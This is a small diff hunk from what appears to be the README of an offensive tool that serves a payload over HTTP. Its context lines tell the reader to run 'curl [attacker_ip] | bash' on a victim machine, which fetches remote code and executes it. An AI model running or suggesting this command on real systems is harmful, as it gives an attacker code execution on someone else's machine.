@@ -38,6 +38,7 @@ optional arguments:
   ```
 
   and serves it on http-server at all interfaces on port 80 at / http://localhost
+  
   on victim machine:
   ```
   curl [attacker_ip] | bash
